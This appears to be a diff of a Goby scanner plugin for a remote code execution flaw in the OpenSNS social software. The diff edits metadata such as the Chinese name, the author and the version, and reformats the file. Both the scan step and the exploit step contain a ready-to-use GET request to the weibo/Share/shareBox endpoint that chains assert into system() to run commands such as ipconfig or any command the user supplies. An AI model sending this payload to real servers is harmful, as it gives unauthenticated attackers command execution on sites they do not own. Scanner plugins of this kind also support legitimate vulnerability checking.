@@ -1,32 +1,28 @@
 {
-      "Name": "OpenSNS RCE",
+      "Name": "OpenSNS 远程代码执行漏洞",
       "Level": "3",
       "Tags": [
             "RCE"
       ],
       "GobyQuery": "body=\"opensns\"",
-      "Description": "OpenSNS is a comprehensive social software developed by Xiangtian Technology.",
+      "Description": "OpenSNS是想天科技开发的一款综合性社交软件，存在命令执行漏洞且是administrator",
       "Product": "OpenSNS",
       "Homepage": "http://www.opensns.cn/",
-      "Author": "",
-      "Impact": "A vulnerability in OpenSNS allows remote unauthenticated attackers to cause the product to execute arbitrary code via the 'shareBox' endpoint.",
-      "Recommendation": "",
+      "Author": "luckying",
+      "Impact": "",
+      "Recommandation": "",
       "References": [
-            "http://www.0dayhack.net/index.php/2417/",
-            "https://www.pwnwiki.org/index.php?title=OpenSNS_%E9%81%A0%E7%A8%8B%E4%BB%A3%E7%A2%BC%E5%9F%B7%E8%A1%8C%E6%BC%8F%E6%B4%9E"
+            "https://www.pwnwiki.org/index.php?title=OpenSNS_%E9%81%A0%E7%A8%8B%E4%BB%A3%E7%A2%BC%E5%9F%B7%E8%A1%8C%E6%BC%8F%E6%B4%9E/zh-cn"
       ],
-      "HasExp": true,
-      "ExpParams": [
-            {
-                  "Name": "Cmd",
-                  "Type": "input",
-                  "Value": "whoami"
-            }
-      ],
-      "ExpTips": {
-            "Type": "",
-            "Content": ""
-      },
+	  "HasExp": true,
+	  "ExpParams": [
+		{
+			"name": "Cmd",
+			"type": "input",
+			"value": "whoami",
+			"show": ""
+		}
+	  ],
       "ScanSteps": [
             "AND",
             {
@@ -34,7 +30,7 @@
                         "method": "GET",
                         "uri": "/index.php?s=weibo/Share/shareBox&query=app=Common%26model=Schedule%26method=runSchedule%26id[status]=1%26id[method]=Schedule-%3E_validationFieldItem%26id[4]=function%26[6][]=%26id[0]=cmd%26id[1]=assert%26id[args]=cmd=system(ipconfig)",
                         "follow_redirect": false,
-                        "header": null,
+                        "header": {},
                         "data_type": "text",
                         "data": ""
                   },
@@ -54,14 +50,14 @@
                   "SetVariable": []
             }
       ],
-      "ExploitSteps": [
+	  "ExploitSteps": [
             "AND",
             {
                   "Request": {
                         "method": "GET",
                         "uri": "/index.php?s=weibo/Share/shareBox&query=app=Common%26model=Schedule%26method=runSchedule%26id[status]=1%26id[method]=Schedule-%3E_validationFieldItem%26id[4]=function%26[6][]=%26id[0]=cmd%26id[1]=assert%26id[args]=cmd=system({{{Cmd}}})",
                         "follow_redirect": false,
-                        "header": null,
+                        "header": {},
                         "data_type": "text",
                         "data": ""
                   },
@@ -79,10 +75,10 @@
                         ]
                   },
                   "SetVariable": [
-                        "output|lastbody|undefined|undefined"
-                  ]
+					"output|lastbody"
+				  ]
             }
       ],
-      "PostTime": "0000-00-00 00:00:00",
-      "GobyVersion": "0.0.0"
+      "PostTime": "2021-06-28 11:44:33",
+      "GobyVersion": "1.8.268"
 }
